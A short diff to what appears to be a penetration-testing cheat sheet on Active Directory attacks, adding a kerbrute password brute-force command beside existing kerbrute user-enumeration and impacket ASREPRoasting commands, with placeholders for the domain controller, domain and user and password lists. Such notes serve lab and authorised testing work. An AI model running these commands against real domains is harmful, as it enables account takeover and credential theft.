@@ -13,6 +13,7 @@
 
 ## spray username or password with kerbrute
 `~/scripts/kerbrute userenum --dc [IP] -d [domain-name] [user_list]`
+`~/scripts/kerbrute bruteuser --dc [IP] -d [domain-name] [password_list] [username]`
 
 ## ASREPRoasting with GetNPUsers.py
 `python3 ~/scripts/impacket/examples/GetNPUsers.py -dc-ip [IP] [domain-name]/[user] -no-pass`
